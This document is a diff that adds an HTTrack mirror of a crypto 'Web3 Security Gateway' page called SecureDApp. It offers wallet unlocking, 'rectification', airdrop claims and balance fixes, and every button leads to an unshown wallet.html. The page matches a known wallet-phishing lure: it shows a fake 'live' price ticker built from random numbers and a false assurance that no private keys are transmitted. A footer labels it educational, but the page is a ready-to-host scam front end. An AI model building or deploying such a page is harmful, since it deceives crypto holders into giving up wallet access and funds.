@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from securedconnect.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Aug 2026 13:00:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureDApp - Web3 Security Gateway</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            overflow-x: hidden;
+        }
+
+        /* Live Ticker */
+        .ticker-bar {
+            background: #0d0d1a;
+            border-bottom: 1px solid #1a1a3e;
+            padding: 8px 0;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+
+        .ticker-track {
+            display: flex;
+            animation: ticker-scroll 30s linear infinite;
+            width: max-content;
+        }
+
+        .ticker-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-right: 50px;
+            font-size: 13px;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+        }
+
+        .ticker-symbol { color: #00bcd4; font-weight: 700; }
+        .ticker-price { color: #fff; }
+        .ticker-up { color: #00e676; }
+        .ticker-down { color: #ff1744; }
+
+        @keyframes ticker-scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        /* Grid Background */
+        .grid-bg {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0, 188, 212, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 188, 212, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Main */
+        .main-container {
+            position: relative;
+            z-index: 1;
+            margin-top: 44px;
+            min-height: 100vh;
+            background: linear-gradient(180deg, #0a0a1a 0%, #0a0a0f 100%);
+        }
+
+        .hero {
+            text-align: center;
+            padding: 80px 20px 40px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(0, 188, 212, 0.1);
+            border: 1px solid rgba(0, 188, 212, 0.3);
+            color: #00bcd4;
+            padding: 6px 20px;
+            border-radius: 50px;
+            font-size: 12px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+
+        .logo-text {
+            font-size: 52px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00bcd4, #7c4dff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -1px;
+            margin-bottom: 8px;
+        }
+
+        .tagline {
+            color: rgba(255,255,255,0.5);
+            font-size: 18px;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+
+        .hero-desc {
+            color: rgba(255,255,255,0.55);
+            max-width: 650px;
+            margin: 0 auto 35px;
+            line-height: 1.7;
+            font-size: 15px;
+        }
+
+        /* Connect Wallet Button */
+        .connect-area {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 60px;
+        }
+
+        .btn-primary {
+            display: inline-block;
+            background: linear-gradient(135deg, #00bcd4, #7c4dff);
+            color: #fff;
+            border: none;
+            padding: 16px 48px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            box-shadow: 0 0 30px rgba(0, 188, 212, 0.2);
+            text-decoration: none;
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px rgba(0, 188, 212, 0.4);
+        }
+
+        .wallet-status {
+            font-size: 13px;
+            color: rgba(255,255,255,0.4);
+            font-family: monospace;
+            min-height: 20px;
+        }
+
+        .wallet-status.connected {
+            color: #00e676;
+        }
+
+        /* Services Section */
+        .services-section {
+            text-align: center;
+            padding: 30px 20px 80px;
+        }
+
+        .section-title {
+            color: #00bcd4;
+            font-size: 18px;
+            font-weight: 400;
+            letter-spacing: 3px;
+            margin-bottom: 40px;
+        }
+
+        .services-grid {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 0 15px;
+        }
+
+        .service-card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(0, 188, 212, 0.12);
+            border-radius: 16px;
+            padding: 28px 18px;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            backdrop-filter: blur(8px);
+            text-decoration: none;
+            display: block;
+            color: inherit;
+        }
+
+        .service-card:hover {
+            border-color: rgba(0, 188, 212, 0.4);
+            background: rgba(0, 188, 212, 0.05);
+            transform: translateY(-3px);
+        }
+
+        .card-icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+        }
+
+        .card-title {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .card-desc {
+            color: rgba(255,255,255,0.4);
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px 20px;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            font-size: 12px;
+            color: rgba(255,255,255,0.2);
+        }
+
+        @media (max-width: 600px) {
+            .logo-text { font-size: 36px; }
+            .tagline { font-size: 14px; letter-spacing: 3px; }
+            .services-grid { grid-template-columns: repeat(2, 1fr); gap: 12px; }
+            .service-card { padding: 20px 12px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Live Crypto Ticker -->
+    <div class="ticker-bar">
+        <div class="ticker-track" id="tickerTrack"></div>
+    </div>
+
+    <!-- Grid Background -->
+    <div class="grid-bg"></div>
+
+    <!-- Main Content -->
+    <div class="main-container">
+
+        <div class="hero">
+            <div class="badge">⛓️ Web3 Security Gateway v2.4</div>
+            <h1 class="logo-text">SecureDApp</h1>
+            <p class="tagline">Protocol Interface</p>
+            <p class="hero-desc">
+                Decentralized security layer for non-custodial wallet resolution. 
+                This protocol enables cross-wallet synchronization, automated dispute resolution, 
+                and real-time blockchain diagnostics. No private keys are ever stored or transmitted.
+            </p>
+
+            <div class="connect-area">
+                <a class='btn-primary' href='wallet.html'>🔗 Connect Wallet</a>
+                <div class="wallet-status" id="walletStatus">● Disconnected</div>
+            </div>
+        </div>
+
+        <div class="services-section">
+            <h2 class="section-title">▼ Select Service</h2>
+            <div class="services-grid">
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🚀</div>
+                    <div class="card-title">Migration</div>
+                    <div class="card-desc">Cross-chain migration support</div>
+                </a>
+				<a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🏗️</div>
+                    <div class="card-title">Staking</div>
+                    <div class="card-desc">Fix Staking/unstaking issue</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🔐</div>
+                    <div class="card-title">Unlock Wallet</div>
+                    <div class="card-desc">Recover locked accounts</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🎨</div>
+                    <div class="card-title">NFT Issues</div>
+                    <div class="card-desc">Minting & transfer help</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">💎</div>
+                    <div class="card-title">Airdrop</div>
+                    <div class="card-desc">Claim available airdrops</div>
+                </a>
+				<a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🪙</div>
+                    <div class="card-title">Rectification</div>
+                    <div class="card-desc">Rectity issue</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">✨</div>
+                    <div class="card-title">Validation</div>
+                    <div class="card-desc">Validate wallet</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🖼️</div>
+                    <div class="card-title">Swap/Exchange</div>
+                    <div class="card-desc"></div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">📈</div>
+                    <div class="card-title">Transaction Delay</div>
+                    <div class="card-desc"></div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🏆</div>
+                    <div class="card-title">Claim V2/4</div>
+                    <div class="card-desc"></div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">⚡</div>
+                    <div class="card-title">Wallet glitch/Error</div>
+                    <div class="card-desc"></div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🎯</div>
+                    <div class="card-title">Dapps Connect</div>
+                    <div class="card-desc">Universal Dapp pairing</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🤝</div>
+                    <div class="card-title">Cross Transfer</div>
+                    <div class="card-desc">Bridge between networks</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🏗️</div>
+                    <div class="card-title">Tx Delay</div>
+                    <div class="card-desc">Fix pending transactions</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">💰</div>
+                    <div class="card-title">Buy Coins</div>
+                    <div class="card-desc">Secure token purchases</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🪙</div>
+                    <div class="card-title">Token Launch</div>
+                    <div class="card-desc">Official distribution</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">✨</div>
+                    <div class="card-title">Value Creation</div>
+                    <div class="card-desc">Ecosystem building</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🖼️</div>
+                    <div class="card-title">NFT Drop #3</div>
+                    <div class="card-desc">Third collection</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">📈</div>
+                    <div class="card-title">Platform Growth</div>
+                    <div class="card-desc">Scaling roadmap</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🏆</div>
+                    <div class="card-title">Rewards</div>
+                    <div class="card-desc">NFT/Token rewards</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">⚡</div>
+                    <div class="card-title">P2P Exchange</div>
+                    <div class="card-desc">Validate for P2P</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🌍</div>
+                    <div class="card-title">Dapps Connect</div>
+                    <div class="card-desc">Universal connection</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🛡️</div>
+                    <div class="card-title">Login Issues</div>
+                    <div class="card-desc">Fix authentication</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🔄</div>
+                    <div class="card-title">Swap</div>
+                    <div class="card-desc">Token exchange</div>
+                </a>
+                <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🔮</div>
+                    <div class="card-title">Balance Issue</div>
+                    <div class="card-desc">Fix missing balance</div>
+                </a>
+				 <a class='service-card' href='wallet.html'>
+                    <div class="card-icon">🎯</div>
+                    <div class="card-title">Other issuses</div>
+                    <div class="card-desc">Click here for other issues</div>
+                </a>
+            </div>
+        </div>
+
+        <div class="footer">
+            SecureDApp Protocol — Educational Cybersecurity Demonstration
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // Crypto Ticker (simulated live data)
+        // ============================================
+        const assets = [
+            { s: 'BTC', p: 67342 }, { s: 'ETH', p: 3456 }, { s: 'BNB', p: 598 },
+            { s: 'SOL', p: 142 }, { s: 'XRP', p: 0.62 }, { s: 'ADA', p: 0.48 },
+            { s: 'AVAX', p: 38.5 }, { s: 'DOT', p: 7.8 }, { s: 'LINK', p: 16.2 },
+            { s: 'MATIC', p: 0.72 }
+        ];
+
+        assets.forEach(a => {
+            a.cp = a.p * (1 + (Math.random() - 0.5) * 0.2);
+            a.ch = ((a.cp - a.p) / a.p * 100);
+        });
+
+        function fmtPrice(v) {
+            return v < 1 ? '$' + v.toFixed(4) : '$' + v.toLocaleString('en-US', {minimumFractionDigits:2,maximumFractionDigits:2});
+        }
+
+        function renderTicker() {
+            const track = document.getElementById('tickerTrack');
+            let html = '';
+            for (let r = 0; r < 2; r++) {
+                assets.forEach(a => {
+                    const cls = a.ch >= 0 ? 'ticker-up' : 'ticker-down';
+                    const sign = a.ch >= 0 ? '+' : '';
+                    html += `<span class="ticker-item">
+                        <span class="ticker-symbol">${a.s}</span>
+                        <span class="ticker-price">${fmtPrice(a.cp)}</span>
+                        <span class="${cls}">${sign}${a.ch.toFixed(2)}%</span>
+                    </span>`;
+                });
+            }
+            track.innerHTML = html;
+        }
+
+        function updatePrices() {
+            assets.forEach(a => {
+                const vol = 0.002;
+                a.cp *= (1 + (Math.random() - 0.5) * vol * 2);
+                a.ch = ((a.cp - a.p) / a.p) * 100;
+            });
+            renderTicker();
+        }
+
+        renderTicker();
+        setInterval(updatePrices, 3000);
+    </script>
+</body>
+
+<!-- Mirrored from securedconnect.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Aug 2026 13:00:01 GMT -->
+</html>
